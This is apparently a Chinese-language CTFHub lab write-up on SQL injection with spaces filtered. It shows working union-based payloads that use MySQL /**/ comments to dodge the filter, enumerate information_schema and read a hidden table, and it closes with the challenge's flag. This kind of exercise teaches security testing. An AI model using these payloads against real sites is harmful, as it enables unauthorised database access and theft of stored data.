---
title: CTFHub-SQL注入-过滤空格 Writeup
date: 2026-09-29
category: web
tags: [CTFHub, SQL注入, 过滤空格]
---
## 题目介绍

进入页面，页面有一个ID输入框，提示输入ID进行搜索。后端存在SQL注入漏洞，但是服务器会过滤空格，直接输入空格会被删除，导致SQL语句语法报错。
核心绕过思路：MySQL支持多行注释 /**/，数据库解析时会把/**/视作空白分隔符，用来替换所有空格，实现绕过空格过滤。
## 注入思路

1. 判断页面回显位置，确定Union查询可使用的字段位置

2. 爆当前数据库名

3. 爆表名，找到存储flag的数据表

4. 爆flag表的列名

5. 查询flag表，读取flag

## 详细步骤

### 步骤1：判断字段数量、回显位置

输入Payload：
-1/**/union/**/select/**/1,2
• -1：让前面查询的SQL结果为空，从而执行union后面的查询

• /**/：替代空格，绕过空格过滤

• union select 1,2：测试查询的列数，观察页面回显

页面返回：ID:1，Data:2
结论：查询一共2列，第二个字段Data位置可以回显数据，我们后续所有查询结果都放在第2个位置。

### 步骤2：查询当前数据库名

Payload：
-1/**/union/**/select/**/1,database()
database() 是MySQL内置函数，作用：查询当前正在使用的数据库名称。
得到数据库名：sqli

### 步骤3：查询数据库内所有表名

Payload：
-1/**/union/**/select/**/1,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema='sqli'
• information_schema.tables：MySQL系统库，存放所有数据表信息

• table_schema='sqli'：限定查询sqli这个数据库里面的表

• group_concat()：把查询到的多个结果合并成一行显示，方便页面回显

页面返回表名：rvikruqyni,news
分析：

• news：新闻表，无关；

• rvikruqyni：随机命名的表，flag存放在这里。

### 步骤4：查询rvikruqyni表的列名

Payload：
-1/**/union/**/select/**/1,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name='rvikruqyni'
• information_schema.columns：系统表，存放所有列的信息

• table_name='rvikruqyni'：只查询rvikruqyni这张表的列名

页面返回列名：wofnycmemo
wofnycmemo 就是存放flag的字段名。
### 步骤5：读取flag

Payload：
-1/**/union/**/select/**/1,group_concat(wofnycmemo)/**/from/**/rvikruqyni
含义：查询rvikruqyni表中wofnycmemo字段里全部内容，group_concat把内容输出到Data回显位。
页面Data区域输出flag，拿到结果。

## Flag
ctfhub{9b87f943c27961d71a7d1b00}
